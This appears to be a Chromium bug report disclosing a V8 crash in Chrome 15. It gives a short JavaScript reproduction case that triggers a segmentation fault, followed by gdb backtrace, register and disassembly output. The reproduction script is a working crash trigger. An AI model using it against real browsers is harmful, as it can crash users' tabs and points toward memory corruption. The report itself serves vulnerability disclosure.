<b>VULNERABILITY DETAILS</b>
The javascript code below causes Chromium 15 to crash in V8.

<b>VERSION</b>
Chrome Version: 15.0.871.0 (Developer Build 99583 Linux)
Operating System: Ubuntu 11.04

<b>REPRODUCTION CASE</b>

function Test() {
  var left  = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
  var right = "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY";
  for (var i = 0; i < 100000; i++) {
    var cons = left + right;
    var substring = cons.substring(20, 80);
    try {
            with ({Test: 'inner' + i}) 
              continue;
    } finally {  }        
  }
}
Test();

<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: tab
Crash State: 

Program received signal SIGSEGV, Segmentation fault.
0x0103e85d in v8::internal::Object::Lookup(v8::internal::String*, v8::internal::LookupResult*) ()
(gdb) bt
#0  0x0103e85d in v8::internal::Object::Lookup(v8::internal::String*, v8::internal::LookupResult*) ()
#1  0x35524479 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
(gdb) info register
eax            0x35524021       894582817
ecx            0xffffffff       -1
edx            0x0      0
ebx            0x3555894        55924884
esp            0xbfffd4e0       0xbfffd4e0
ebp            0x3fcee081       0x3fcee081
esi            0xbfffd5c4       -1073752636
edi            0x2685366d       646264429
eip            0x103e85d        0x103e85d <v8::internal::Object::Lookup(v8::internal::String*, v8::internal::LookupResult*)+93>
eflags         0x210293 [ CF AF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x /4i $pc
=> 0x103e85d <_ZN2v88internal6Object6LookupEPNS0_6StringEPNS0_12LookupResultE+93>:      mov    (%ecx),%eax
   0x103e85f <_ZN2v88internal6Object6LookupEPNS0_6StringEPNS0_12LookupResultE+95>:      and    $0xffffe000,%eax
   0x103e864 <_ZN2v88internal6Object6LookupEPNS0_6StringEPNS0_12LookupResultE+100>:     mov    0x14(%eax),%ebp
   0x103e867 <_ZN2v88internal6Object6LookupEPNS0_6StringEPNS0_12LookupResultE+103>:     cmp    0x12c(%ebp),%edx
